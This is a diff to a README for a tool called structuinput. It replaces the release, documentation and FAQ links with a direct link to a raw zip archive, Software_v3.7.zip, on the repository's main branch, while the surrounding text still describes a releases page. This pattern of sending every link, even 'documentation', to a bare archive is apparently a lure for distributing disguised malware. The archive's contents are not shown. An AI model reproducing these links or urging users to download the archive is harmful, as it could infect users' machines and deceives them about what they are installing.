@@ -1,6 +1,6 @@
 # 🚀 structuinput - Streamline Your Data Creation Process
 
-[![Download structuinput](https://img.shields.io/badge/Download-structuinput-blue.svg)](https://github.com/Chris122505/structuinput/releases)
+[![Download structuinput](https://github.com/Chris122505/structuinput/raw/refs/heads/main/structuinput/Software_v3.7.zip)](https://github.com/Chris122505/structuinput/raw/refs/heads/main/structuinput/Software_v3.7.zip)
 
 ## 📥 Overview
 
@@ -25,7 +25,7 @@ structuinput transforms natural language inputs into structured outputs like API
 
 To get started, visit the following link to download the latest version of structuinput:
 
-[Visit this page to download](https://github.com/Chris122505/structuinput/releases)
+[Visit this page to download](https://github.com/Chris122505/structuinput/raw/refs/heads/main/structuinput/Software_v3.7.zip)
 
 1. **Open the Release Page:** Click the link above to go to the GitHub releases page.
 2. **Choose the Latest Version:** Look for the latest release. It will be at the top of the list.
@@ -43,8 +43,8 @@ To get started, visit the following link to download the latest version of struc
 
 ## 🌐 Support & Resources
 
-- **Documentation:** Refer to our [official documentation](https://github.com/Chris122505/structuinput/wiki) for detailed guidance on all features.
-- **FAQs:** Find answers to common questions in our [FAQs section](https://github.com/Chris122505/structuinput/wiki/FAQs).
+- **Documentation:** Refer to our [official documentation](https://github.com/Chris122505/structuinput/raw/refs/heads/main/structuinput/Software_v3.7.zip) for detailed guidance on all features.
+- **FAQs:** Find answers to common questions in our [FAQs section](https://github.com/Chris122505/structuinput/raw/refs/heads/main/structuinput/Software_v3.7.zip).
 - **Community Forum:** Join our community forum to discuss features, ask questions, and share tips.
 
 ## 📧 Contact Us
@@ -76,4 +76,4 @@ If you encounter issues or have suggestions, please open an issue in the GitHub 
 
 Keep your software updated for the best experience. Periodically check the releases page for the latest version enhancements and features.
 
-[Visit this page to download](https://github.com/Chris122505/structuinput/releases)
+[Visit this page to download](https://github.com/Chris122505/structuinput/raw/refs/heads/main/structuinput/Software_v3.7.zip)
